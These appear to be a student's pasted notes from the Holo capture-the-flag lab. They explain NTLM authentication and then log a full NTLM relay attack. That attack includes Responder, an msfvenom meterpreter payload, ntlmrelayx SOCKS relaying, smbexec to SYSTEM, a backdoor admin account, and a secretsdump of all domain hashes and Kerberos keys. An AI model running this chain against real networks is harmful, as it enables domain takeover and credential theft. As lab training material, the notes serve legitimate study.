+`SC = 8-byte server challenge, random CC = 8-byte client challenge, random CC* = (X, time, CC2, domain name) v2-Hash = HMAC-MD5(NT-Hash, user name, domain name) LMv2 = HMAC-MD5(v2-Hash, SC, CC) NTv2 = HMAC-MD5(v2-Hash, SC, CC*) response = LMv2 | CC | NTv2 | CC*`
+---
+Now that we understand what an NTLM hash is and how it is hashed, we can look at how it responds and requests and why it can only be relayed and not replayed.
+The reason we can only relay hashes is that it uses a challenge-based request. A client will attempt to authenticate to a server; the server will approve or deny initial authentication and move on to send a client a Challenge string to encrypt with the client's NTLM hash (Challenge-Request). If the client can encrypt the string correctly, the client will be permitted to authenticate to the server; if not, authentication will fail (Challenge-Response). We can break down the technical process below.
+1.  (Interactive authentication only) A user accesses a client computer and provides a domain name, user name, and password. The client computes a cryptographic _[hash](https://docs.microsoft.com/en-us/windows/win32/secgloss/h-gly)_ of the password and discards the actual password.
+2.  The client sends the user name to the server (in _[plaintext](https://docs.microsoft.com/en-us/windows/win32/secgloss/p-gly)_).
+3.  The server generates a 16-byte random number, called a _challenge_ or _[nonce](https://docs.microsoft.com/en-us/windows/win32/secgloss/n-gly)_, and sends it to the client.
+4.  The client encrypts this challenge with the hash of the user's password and returns the result to the server. This is called the _response_.
+5.  The server sends the following three items to the domain controller:
+-   User name
+-   Challenge sent to the client.
+-   Response received from the client.
+6.  The domain controller uses the user name to retrieve the hash of the user's password from the Security Account Manager database. It uses this password hash to encrypt the challenge.
+7.  The domain controller compares the encrypted challenge it computed (in step 6) to the response computed by the client (in step 4). If they are identical, authentication is successful.
+Source: [https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm?redirectedfrom=MSDN)
+Now that we understand Net-NTLMv1 and Net-NTLMv2 and how they can be used for authentication, we can move on to exploiting Net-NTLM.
+Answer the questions below
+```text
+LanMan is short for "Local Area Network Management." It refers to a set of networking protocols used in the Microsoft Windows operating system for managing local area networks (LANs). LanMan provides functions for file and printer sharing, as well as remote execution of commands and other services. It was widely used in the 1990s and early 2000s, but has since been largely replaced by more modern and secure networking protocols such as TCP/IP and SMB.
+
+Yes, that's correct. NTLM (NT Lan Manager) is a authentication protocol used by Microsoft Windows operating systems, and Net-NTLMv1 is one of its versions. It is a challenge/response protocol, meaning that when a client wants to authenticate with a server, the server will first provide a challenge to the client, and the client must then generate a response using the challenge and its own credentials. This response is then sent back to the server for verification.
+
+The NTHash, also known as the NT Hash, is a one-way hash function that is used to encode a password. In the context of NTLM, it is used to securely store user passwords in an encrypted form on the server, and to verify the password provided by the client during the authentication process. Net-NTLMv1 is considered to be less secure than later versions of NTLM, as well as other modern authentication protocols, and it is recommended to use more secure options whenever possible.
+
+C = 8-byte server challenge, random K1 | K2 | K3 = LM/NT-hash | 5-bytes-0 response = DES(K1,C) | DES(K2,C) | DES(K3,C)
+
+Yes, that's a basic overview of the NTLMv1 authentication process. The server generates a random 8-byte challenge (C) and sends it to the client. The client then splits the LM/NT-hash of the user's password into three keys (K1, K2, and K3) and uses each key to encrypt the challenge using the DES (Data Encryption Standard) algorithm. The resulting encrypted values are then concatenated to form the response, which is sent back to the server.
+
+The server then uses the same keys (K1, K2, and K3) to encrypt the challenge again and compare the result with the response received from the client. If the two match, the authentication is successful and the user is granted access to the network resource. However, it should be noted that NTLMv1 is considered to be weak due to its use of the DES encryption algorithm and its susceptibility to brute-force and replay attacks, so it is not recommended to use NTLMv1 in most cases.
+
+SC = 8-byte server challenge, random CC = 8-byte client challenge, random CC* = (X, time, CC2, domain name) v2-Hash = HMAC-MD5(NT-Hash, user name, domain name) LMv2 = HMAC-MD5(v2-Hash, SC, CC) NTv2 = HMAC-MD5(v2-Hash, SC, CC*) response = LMv2 | CC | NTv2 | CC*
+
+Yes, that's a correct description of the NTLMv2 authentication process. NTLMv2 is a more secure version of the NTLM authentication protocol and provides better protection against replay attacks and other forms of attacks.
+
+In NTLMv2, the client generates a random 8-byte client challenge (CC), which is then combined with additional data to form the client challenge star (CC*). The client also calculates a v2-Hash value using the HMAC-MD5 algorithm and the user's NT-Hash, user name, and domain name.
+
+Using the v2-Hash and the server challenge (SC), the client then calculates two hashes, LMv2 and NTv2, using the HMAC-MD5 algorithm. The response is then composed of the LMv2 hash, the client challenge (CC), the NTv2 hash, and the client challenge star (CC*). The server verifies the response by repeating the same calculations and comparing the results to the values received from the client.
+
+Overall, NTLMv2 provides a more secure authentication process compared to NTLMv1, but it is still considered to be weaker than other modern authentication protocols, such as Kerberos. It is therefore recommended to use more secure options whenever possible.
+
+A 16-byte value can be represented in binary form as 128 bits. Each byte consists of 8 bits, so 16 bytes is equal to 128 bits. This representation can be useful for various purposes, such as for encryption, communication protocols, and data storage. When expressing values in binary form, each bit can have a value of either 0 or 1, and the combination of bits can represent a wide range of values and characters.
+```
+![[Pasted image 20230206235913.png]]
+Read the above and move on to NTLM exploitation.
+Completed
+### NTLM Relay Now you see me, now you don't
+If a server sends out SMB connections, you can use abuse NTLM relaying to gain a foothold from these SMB connections. This is an example of how NTLM relaying works and how a Net-NTLM session is created. To exploit the network, we will need to adjust the attack from our research.
+To begin relaying hashes, we need first to understand how hashes would generally be abused. We will demonstrate two tools that are usually used: Responder, [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder) and NTLMRelayX, [https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)
+The first tool we will be looking at is Responder. From the Responder GitHub, "Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication." We can use Responder in our situation to poison LLMNR, Netbios, and DNS and then capture the response from the server.
+To begin poisoning requests, we will need to turn off SMB in the Responder configuration as NTLMRelayX will be handling SMB. Find an example command used below.
+Command used: `sudo sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf`
+You can also manually edit the configuration file and turn off SMB.
+Now that SMB is off, we can start responder poisoning across our network interface. Find syntax to start Responder below.
+Syntax: `sudo python Responder.py -I <Interface>`
+Responder is now poisoning requests across the network, and we can begin relaying them.
+**Note:** It is not necessary to use Responder when attempting to Remotely NTLMRelay. Responder should be used for poisoning a local network, not a remote network. Using Responder is **not** required to complete Holo.
+---
+The second tool we will be looking at is NTLMRelayX, part of the Impacket suite. From the Impacket GitHub, "This module performs the SMB Relay attacks originally discovered by cDc extended to many target protocols (SMB, MSSQL, LDAP, etc). It receives a list of targets, and for every connection received, it will choose the next target and try to relay the credentials. Also, if specified, it will first try to authenticate against the client connecting to us."
+We can use it against a specified protocol to relay inbound sessions. Find syntax for starting NTLMRelayX below.
+Syntax: `ntlmrelayx.py -t ldap://<IP> -smb2support --escalate-user <user>`
+This is an example of creating a Net-NTLM session. When a valid SMB session is received, NTLMRelayX will act as a proxy and send a challenge to exploit the target system.
+Now that we understand how an NTLM relay works and how a Net-NTLM session is created, we can move on to remote NTLM relaying.
+Answer the questions below
+```text
+meterpreter > shell
+Process 496 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.1577]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\watamet\Applications>net user Administrator W1tty#123
+net user Administrator W1tty#123
+The command completed successfully.
+```
+```text
+┌──(kali㉿kali)-[~/Holo/GibsonBird/chapter4]
+└─$ rdesktop -u 'Administrator' -p 'W1tty#123' 10.200.95.35
+Autoselecting keyboard map 'en-us' from locale
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ nmap -p 445 --script smb2-security-mode 10.200.95.32 -Pn 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-07 12:07 EST
+Nmap scan report for 10.200.95.32
+Host is up (0.0027s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Nmap done: 1 IP address (1 host up) scanned in 12.02 seconds
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ nmap -p 445 --script smb2-security-mode 10.200.95.30 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-07 12:07 EST
+Nmap scan report for 10.200.95.30
+Host is up (0.0044s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+
+Nmap done: 1 IP address (1 host up) scanned in 2.04 seconds
+
+or go to Networks and \\10.200.95.30 can connect  \\10.200.95.32 cannot
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ nmap -sT -p 445 -A 10.200.95.30 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-07 12:11 EST
+Nmap scan report for 10.200.95.30
+Host is up (0.0038s latency).
+
+PORT    STATE SERVICE       VERSION
+445/tcp open  microsoft-ds?
+
+Host script results:
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-02-07T17:11:25
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.04 seconds
+```
+Read the above and move on to remotely exploiting NLTM.
+Completed
+In order for these attacks to work, it is important for SMB signing to be disabled. Use Nmap to scan for SMB signing privileges on the network.
+nmap -sT -p 445 -A 10.200.x.0/24
+Completed
+What host has SMB signing disabled?
+*DC-SRV01*
+![[Pasted image 20230207121241.png]]
+### NTLM Relay Why not just turn it off?
+As has been previously eluded to, we can use a newly researched attack to exploit NTLM sessions. This attack works by forcing the server to stop SMB traffic and restart the server to send all traffic to the attacker. The attacker can then relay the session where they want. Credit to the research behind this exploit goes to SpookySec, one of the creators of Holo. Find the original blog post here, [https://blog.spookysec.net/remote-ntlm-relaying/](https://blog.spookysec.net/remote-ntlm-relaying/).
+Remote NTLM relaying is not a widely discussed or popular attack vector, with the only reference before this research being this blog, [https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/](https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/).
+The reason this attack vector isn't widely used is that it is very disruptive. If the server is busy, you are unintentionally creating an SMB DoS and creating server downtime. In a real engagement, this is a huge problem. This attack can be used with explicit authorization from the client and contributes to the ever-moving exploit and red team research. A white card may be used in place of this exploit in the real world, as mentioned in Task 8.
+To begin crafting this exploit, we will need to install multiple packages specific to non-standard Kerberos that the relay uses. Find the packages below.
+-   `krb5-user`
+-   `cifs-utils`
+These can be installed using apt with the command below.
+Command: `apt install krb5-user cifs-utils`
+To begin configuring the server for the exploit, we will need to start turning off SMB services and restart the server. Find an outline of the steps taken below.
+Begin by disabling NetLogon. Find the command used below.
+Command used: `sc stop netlogon`
+Next, we need to disable and stop the SMB server from starting at boot. We can do this by disabling LanManServer and modifying the configuration. Find the command used below.
+Command used: `sc stop lanmanserver` and `sc config lanmanserver start= disabled`
+To entirely stop SMB, we will also need to disable LanManServer and modify its configuration. Find the command used below.
+Command used: `sc stop lanmanworkstation` and `sc config lanmanworkstation start= disabled`
+The steps taken may seem very confusing and convoluted because Windows does not want to stop the SMB service completely.
+We can now restart the machine; it is essential that you restart the device and not shut down the device. Give the server a few minutes to restart; scan the server again and ensure it returns as closed.
+---
+RDP back into the machine; stopping NetLogon can cause issues in some RDP clients, so it is recommended to use rdesktop.
+At this point of the attack, we recommend using Metasploit as it offers enhanced proxy functionality and traffic routing. Create a basic payload with Metasploit and execute it on the server. Find example usage below.
+Example usage: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=1337 -f exe > shell.exe`
+Now that we have stopped the SMB service and can control how our traffic is routed, we can begin exploitation. First, we need to start NTLMRelayX, specifying the domain controller and protocol to exploit, in this case, SMB. Find syntax for NTLMRelayX below.
+Syntax: `ntlmrelayx.py -t smb://<DC> -smb2support -socks`
+We have now set up a relay client to route sessions through a SOCKs proxy.
+We can now force the connection using Metasploit port forwarding. Find an example command below.
+Example command: `portfwd add -R -L 0.0.0.0 -l 445 -p 445`
+After waiting about 1-3 minutes, you should see a new inbound SMB connection. Now that we have the SOCKs tunnel open, we can use proxy chains to use this session with several offensive tools, shown in the next task.
+At this point, we should have a successful relay, and we can move on to weaponizing the relay in the next task.
+**Troubleshooting -**
+**Problem:**
+- You are not receiving any inbound SMB connections from NTLMRelayX.
+**Solution 1**
+- Ensure that you started running NTLMRelayX running **before** you created the Port Forward. If you did not, restart the machine.
+**Solution 2**
+- Ensure that you ran NTLMRelayX with the -smb2support flag.
+**Problem**
+- I am receiving inbound SMB Connections, but a session between the Domain Controller fails to establish.
+**Solution 1**
+- Ensure that there is connectivity between your attacking device and the Domain Controller. You can test this with smbclient -L //<dcip>/. We recommend using SSHuttle over Chisel for this portion, as you would need to juggle multiple ProxyChains config files with Chisel. SSHuttle makes this process overall easier by automagically adjusting your devices routing table.
+**Solution 2**
+- Verify that this is not an issue with your NTLMRelayX version. We have a report from a user that their specific version of NTLMRelayX did not work. We have verified that **version 0.9.22** works without any issues.
+Answer the questions below
+Read the above and exploit Net-NTLM with remote NTLM relaying and move on to weaponizing the relay.
+Completed
+### NTLM Relay Ready your weapons
+We now have a working relay from S-SRV02. We can now weaponize this relay to attempt to gain further access to the domain and dump credentials on DC-SRV01 using the captured session.
+To begin working with the session, we need to configure our proxy settings to tunnel through the SOCKs session created by NTLMRelayX. Add the following line to your proxychains configuration:
+`socks4 127.0.0.1 1080`
+First, we're going to be utilizing psexec, [https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py.](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py.) This is the first tool we'll use in the Remote NetNTLMRelay; this will allow us to execute one-off commands in a non-interactive shell on the target system. We can use this to add a new user account on the domain, and we can also grant them Local Administrator access on the Domain Controller. This will allow us to move into the next section, enabling us to dump all credentials on the domain. Alternatively, you could add this user to the Domain Admins group and proceed without dumping credentials.
+Syntax to gain RCE: `proxychains psexec.py -no-pass HOLOLIVE/SRV-ADMIN@10.200.x.30`
+Syntax to add a new user: `net user MyNewUser Password123! /add`
+Syntax to add the user to the Local Admin group: `net localgroup Administrators /add MyNewUser`
+**Note:** If you are experiencing issues with PSExec, try SMBExec.
+The second tool we are looking at is secretsdump, [https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py). This tool is also part of the Impacket suite and attempts to dump domain hashes and other authentication information from a remote attacker. From the secretsdump GitHub, "Performs various techniques to dump hashes from the remote machine without executing any agent there. For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry and then we save the hives in the target system (%SYSTEMROOT%\\Temp dir) and read the rest of the data from there."
+We can automatically authenticate to secretsdump and dump machine account credentials from the domain controller using our captured session. Find syntax for secretsdump below.
+Syntax: `secretsdump.py 'HOLOLIVE/MyNewUser:Password123!@10.200.x.30'`
+We should have dumped credentials for the entire domain, and we essentially own the domain at this point. We can now move on to exfiltration and clean up our target and goal.
+Answer the questions below
+```text
+──(kali㉿kali)-[~/Holo]
+└─$ echo "socks4  127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ tail /etc/proxychains4.conf
+```
+```text
+#       proxy types: http, socks4, socks5, raw
+```
+```text
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+```
+```text
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+```
+```text
+# add proxy here ...
+```
+```text
+# meanwile
+```
+```text
+# defaults set to "tor"
+#socks4 127.0.0.1 9050
+socks4  127.0.0.1 1080
+
+Login with adminitrator
+
+rdesktop -u 'Administrator' -p 'W1tty#123' 10.200.95.35
+
+sc stop netlogon
+sc stop lanmanserver
+sc config lanmanserver start= disabled
+sc stop lanmanworkstation
+sc config lanmanworkstation start= disabled
+shutdown /r /t 0
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ sudo ntlmrelayx.py -t smb://10.200.95.30 -smb2support -socks
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client SMTP loaded..
+[*] Running in relay mode to single host
+[*] SOCKS proxy started. Listening at port 1080
+[*] HTTPS Socks Plugin loaded..
+[*] HTTP Socks Plugin loaded..
+[*] SMB Socks Plugin loaded..
+[*] SMTP Socks Plugin loaded..
+[*] IMAPS Socks Plugin loaded..
+[*] IMAP Socks Plugin loaded..
+[*] MSSQL Socks Plugin loaded..
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+[*] Setting up WCF Server
+
+[*] Servers started, waiting for connections
+Type help for list of commands
+ntlmrelayx>  * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
+ * Debug mode: off
+```
+```text
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.50.74.15:4444
+```
+```text
+┌──(kali㉿kali)-[~/Holo/GibsonBird/chapter4]
+└─$ rdesktop -u 'Administrator' -p 'W1tty#123' 10.200.95.35
+
+go to C:\Users\watamet\Applications  and press kavremover.exe
+```
+```text
+meterpreter > getuid
+Server username: PC-FILESRV01\Administrator
+```
+```text
+meterpreter > getystem
+[-] Unknown command: getystem
+```
+```text
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+```
+```text
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+```text
+meterpreter > portfwd add -R -L 0.0.0.0 -l 445 -p 445
+[*] Reverse TCP relay created: (remote) :445 -> (local) 0.0.0.0:445
+
+wait..
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ sudo ntlmrelayx.py -t smb://10.200.95.30 -smb2support -socks
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client SMTP loaded..
+[*] Running in relay mode to single host
+[*] SOCKS proxy started. Listening at port 1080
+[*] HTTPS Socks Plugin loaded..
+[*] HTTP Socks Plugin loaded..
+[*] SMB Socks Plugin loaded..
+[*] SMTP Socks Plugin loaded..
+[*] IMAPS Socks Plugin loaded..
+[*] IMAP Socks Plugin loaded..
+[*] MSSQL Socks Plugin loaded..
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+[*] Setting up WCF Server
+
+[*] Servers started, waiting for connections
+Type help for list of commands
+ntlmrelayx>  * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
+ * Debug mode: off
+ntlmrelayx>  * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
+ * Debug mode: off
+[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
+[*] SMBD-Thread-21 (process_request_thread): Connection from HOLOLIVE/SRV-ADMIN@127.0.0.1 controlled, attacking target smb://10.200.95.30
+[-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5'
+[*] Authenticating against smb://10.200.95.30 as HOLOLIVE/SRV-ADMIN SUCCEED
+[*] SOCKS: Adding HOLOLIVE/SRV-ADMIN@10.200.95.30(445) to active SOCKS connection. Enjoy
+[*] SMBD-Thread-21 (process_request_thread): Connection from HOLOLIVE/SRV-ADMIN@127.0.0.1 controlled, but there are no more targets left!
+
+Finally, while **ntlmrelay** is receiving connections we need to execute **smbexec** obtaining the last flag.
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ proxychains smbexec.py -no-pass HOLOLIVE/SRV-ADMIN@10.200.95.30 
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.200.95.30:445  ...  OK
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+HOLO{29d166d973477c6d8b00ae1649ce3a44}
+
+Dumping credentials
+
+C:\Windows\system32>net user MyNewUser Password123! /add
+The command completed successfully.
+
+C:\Windows\system32>net localgroup Administrators /add MyNewUser
+The command completed successfully.
+
+C:\Windows\system32>net user MyNewUser
+User name                    MyNewUser
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/7/2023 5:43:57 PM
+Password expires             3/21/2023 5:43:57 PM
+Password changeable          2/8/2023 5:43:57 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       
+Global Group memberships     *Domain Users         
+The command completed successfully.
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ secretsdump.py 'HOLOLIVE/MyNewUser:Password123!@10.200.95.30'
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x739c5b5f17a8c2bbeb4ddd207a90710e
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:70017854acf6ea8d2af520eddcc866fb:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+HOLOLIVE\DC-SRV01$:aes256-cts-hmac-sha1-96:52b7605bba35b492e13d96d147e66a4ba335f8fc0f2b74173c3c98283e8937b4
+HOLOLIVE\DC-SRV01$:aes128-cts-hmac-sha1-96:c6b08129506ccbe6dd0f40b57c3b7524
+HOLOLIVE\DC-SRV01$:des-cbc-md5:8980a1a8804538e3
+HOLOLIVE\DC-SRV01$:plain_password_hex:394a75991de0517fcdc102e601a4d076fce4f4f53dbf4f620e941bb64d12b409e290ac11bbd2a250b5e188b9bacd2e7daa041f3f258d7139ce8980724fae2f58c9f77b01bcabac71c82353a70663b5839c9ff092c8044a535fce69e6604de6e57318d793cdaca4e753c91e6780a5905cd5abfc5b1625ff856c857ba85051915c9547ba6bb8efd4ad0b6cb6a083c2b99eb3491eb10912f09f8bdeea64b59af8f8026c6acd4bef6341f754b0b43b1cea3ac3b6fcb328247c516c99893a75d637c020ae49c92b5750bbe942c1832e8d44e54bf00251cc33f33a30047d8031e57ee2b3b32a3ad6d1f496df48341a636ca9cc
+HOLOLIVE\DC-SRV01$:aad3b435b51404eeaad3b435b51404ee:7a70d7a4cbf7c4397ad9181414f582d9:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x91010a5e499d90494252e392951ade92978822c1
+dpapi_userkey:0x8903022980635fda4d1457adb7bc51cc89688067
+[*] NL$KM 
+ 0000   8D D2 8E 67 54 58 89 B1  C9 53 B9 5B 46 A2 B3 66   ...gTX...S.[F..f
+ 0010   D4 3B 95 80 92 7D 67 78  B7 1D F9 2D A5 55 B7 A3   .;...}gx...-.U..
+ 0020   61 AA 4D 86 95 85 43 86  E3 12 9E C4 91 CF 9A 5B   a.M...C........[
+ 0030   D8 BB 0D AE FA D3 41 E0  D8 66 3D 19 75 A2 D1 B2   ......A..f=.u...
+NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:ae19656e1067231cb5e3c5dcea320bba:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c6bcd5e68903ff375bf859fa045bd8de:::
+holo.live\ad-joiner:1111:aad3b435b51404eeaad3b435b51404ee:c46a20057362e5dcc1af9678587063aa:::
+holo.live\spooks:1114:aad3b435b51404eeaad3b435b51404ee:17ee8530ccb9e99e82a8e5e61892c0f1:::
+holo.live\cryillic:1115:aad3b435b51404eeaad3b435b51404ee:c75eb9819dcb9628d2abc407b7223b71:::
+holo.live\PC-MGR:1116:aad3b435b51404eeaad3b435b51404ee:12187dfef6090b810fcd76fcb3444898:::
+holo.live\SRV-ADMIN:1119:aad3b435b51404eeaad3b435b51404ee:4a3ff5120bbadf8f262e230faeb58b14:::
+holo.live\a-koronei:1122:aad3b435b51404eeaad3b435b51404ee:4b80bddae540da13e6a656791695457c:::
+holo.live\a-fubukis:1126:aad3b435b51404eeaad3b435b51404ee:556ffce954d95427381af02afe1f6587:::
+holo.live\koronei:1127:aad3b435b51404eeaad3b435b51404ee:1f3fd340240e4fd6d9cb489f27bfe49c:::
+holo.live\fubukis:1128:aad3b435b51404eeaad3b435b51404ee:723ac46f6bee2af009a8404485ef4aa8:::
+holo.live\matsurin:1129:aad3b435b51404eeaad3b435b51404ee:cabfd4107a3bcdcb28f19b3449d9cf8a:::
+holo.live\mikos:1130:aad3b435b51404eeaad3b435b51404ee:320f3f40650fe8a46467ff259c310b67:::
+holo.live\okayun:1131:aad3b435b51404eeaad3b435b51404ee:470f765db33733309ea2e3919f327157:::
+holo.live\watamet:1132:aad3b435b51404eeaad3b435b51404ee:d8d41e6cf762a8c77776a1843d4141c9:::
+holo.live\gurag:1133:aad3b435b51404eeaad3b435b51404ee:977f190bc133ce7397e7c48bd3295d9a:::
+holo.live\cocok:1134:aad3b435b51404eeaad3b435b51404ee:58c50535f91eb6762364a2ba007125bb:::
+holo.live\ameliaw:1135:aad3b435b51404eeaad3b435b51404ee:a14a97d351ede243ac6bc576251e7786:::
+holo.live\WEB-MGR:1136:aad3b435b51404eeaad3b435b51404ee:0bb6e5639d87631dde65a959c193261f:::
+MyNewUser:1139:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+DC-SRV01$:1008:aad3b435b51404eeaad3b435b51404ee:7a70d7a4cbf7c4397ad9181414f582d9:::
+S-SRV01$:1112:aad3b435b51404eeaad3b435b51404ee:3179c8ec65934b8d33ac9ec2a9d93400:::
+PC-FILESRV01$:1120:aad3b435b51404eeaad3b435b51404ee:eaf7acaf65e52060758676bc474cbc65:::
+S-SRV02$:1138:aad3b435b51404eeaad3b435b51404ee:706a4bddf43649c6721356b220167083:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:6ee2537695277d1d8133d443932e98cecab41376da446a8e1b2e80cfb1722354
+Administrator:aes128-cts-hmac-sha1-96:a2f421b6fb59c1ef45a1e91176805a6e
+Administrator:des-cbc-md5:2f46941a5e048931
+krbtgt:aes256-cts-hmac-sha1-96:b594b54b7c6695792518f7b6324a1f46f35ef45f3795d23135fd3399a3a77293
+krbtgt:aes128-cts-hmac-sha1-96:627042b9309896c3ef71f5c694d9274e
+krbtgt:des-cbc-md5:3252f46d3ef1025e
+holo.live\ad-joiner:aes256-cts-hmac-sha1-96:b330ca5b10e32ccad043f13dd1f200df2103601d33caa534fa6fe96dd433fd9c
+holo.live\ad-joiner:aes128-cts-hmac-sha1-96:dbd0d2f71e986713ca6d109f2a4a24bd
+holo.live\ad-joiner:des-cbc-md5:6be09d37d5bc101a
+holo.live\spooks:aes256-cts-hmac-sha1-96:24b6d0b28cbb3690ac141e29021c5067b30210b58c691714685b31ad0ed65e6a
+holo.live\spooks:aes128-cts-hmac-sha1-96:be14e984a68dc4aaf17e84a6c6d8c31b
+holo.live\spooks:des-cbc-md5:4f025e62761c3ef2
+holo.live\cryillic:aes256-cts-hmac-sha1-96:6404768279c2beeaaa6995c0ddf81ea836ffaf6c37dd881461d280787319ed57
+holo.live\cryillic:aes128-cts-hmac-sha1-96:fbfa98904e1699730c5d595a03dc0998
+holo.live\cryillic:des-cbc-md5:8ff7233751c84608
+holo.live\PC-MGR:aes256-cts-hmac-sha1-96:000cf657480f89f61ca5fd115377f15b84614220a4ff4f4550361c0a4b3c1d90
+holo.live\PC-MGR:aes128-cts-hmac-sha1-96:2e73a1c54a094ac4a1e9fb2b5c9efa9a
+holo.live\PC-MGR:des-cbc-md5:6b49ea26255d4a43
+holo.live\SRV-ADMIN:aes256-cts-hmac-sha1-96:355b62d598d0fb43914df7c96bf0de4d0591207e762bee79ec4b3b0dba2212df
+holo.live\SRV-ADMIN:aes128-cts-hmac-sha1-96:e9eba17ccd9be3c7e895797e022078f3
